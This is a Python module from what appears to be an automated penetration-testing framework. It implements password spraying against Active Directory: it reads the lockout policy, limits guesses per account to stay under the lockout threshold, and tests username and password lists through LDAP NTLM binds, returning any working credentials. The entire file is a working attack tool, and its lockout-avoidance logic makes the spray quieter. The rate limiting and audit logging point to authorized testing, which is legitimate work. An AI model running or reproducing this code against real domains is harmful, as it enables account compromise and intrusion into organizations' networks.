"""
Lockout-safe credential spray module.

FR-ATK-06 | MITRE T1110.003 | BR-SAFE-05
Reads live AD lockout policy before spraying.
Falls back to 2 attempts/account/hour when policy is unreadable.
"""

from __future__ import annotations

from aiptt.attacks.base import AbstractAttackModule, AttackResult
from aiptt.guardrail.rate_limiter import CredentialRateLimiter
from aiptt.audit.logger import get_audit_logger


class Module(AbstractAttackModule):
    module_id       = "CRED-SPRAY-001"
    mitre_technique = "T1110.003"
    destructive     = False
    sandboxable     = True

    def execute(self, target: str, parameters: dict) -> AttackResult:
        dc_ip     = parameters.get("dc_ip", target)
        domain    = parameters.get("domain", "")
        userlist  = parameters.get("userlist", [])   # List of usernames
        passwords = parameters.get("passwords", [])  # Password candidates

        if not domain or not userlist or not passwords:
            return AttackResult(False, "MISSING_PARAMS", False, "none",
                                "domain, userlist, and passwords are required")

        audit   = get_audit_logger()
        limiter = CredentialRateLimiter(dc_ip, domain)
        policy  = limiter.get_lockout_policy()

        if policy.threshold is None:
            # Edge case: unreadable policy → safe default (BR-SAFE-05)
            max_attempts = limiter.DEFAULT_MAX_ATTEMPTS
            window_mins  = limiter.DEFAULT_WINDOW_MINUTES
            audit.log_event("UNKNOWN_LOCKOUT_POLICY_DEFAULT",
                             dc_ip=dc_ip, max_attempts=max_attempts)
        else:
            max_attempts = max(1, policy.threshold - limiter.LOCKOUT_SAFETY_MARGIN)
            window_mins  = policy.observation_window_minutes

        successful_creds = []

        for username in userlist:
            attempts = 0
            for password in passwords:
                if attempts >= max_attempts:
                    break

                # Rate-limit enforcement (ensures we never exceed threshold)
                limiter.wait_if_needed(username, window_mins)

                if self._try_login(dc_ip, domain, username, password):
                    successful_creds.append({
                        "username": username,
                        "password": password,
                        "domain":   domain,
                    })
                    # Record success
                    limiter.record_attempt(
                        parameters.get("engagement_id", ""),
                        dc_ip, username, True)
                    break
                else:
                    limiter.record_attempt(
                        parameters.get("engagement_id", ""),
                        dc_ip, username, False)
                    attempts += 1

        if successful_creds:
            return AttackResult(
                success=True,
                outcome="SUCCESS",
                gained_access=True,
                access_level="user",
                output=f"Compromised {len(successful_creds)} accounts",
                credentials_captured=successful_creds,
            )
        return AttackResult(False, "NO_VALID_CREDS", False, "none",
                            "No credentials validated")

    def _try_login(self, dc_ip: str, domain: str,
                   username: str, password: str) -> bool:
        """Attempt a single LDAP authentication."""
        try:
            import ldap3  # type: ignore
            server = ldap3.Server(dc_ip, use_ssl=False, connect_timeout=5)
            conn   = ldap3.Connection(
                server,
                user=f"{domain}\\{username}",
                password=password,
                authentication=ldap3.NTLM,
                auto_bind=True,
                receive_timeout=10,
            )
            bound = conn.bound
            conn.unbind()
            return bound
        except Exception:
            return False
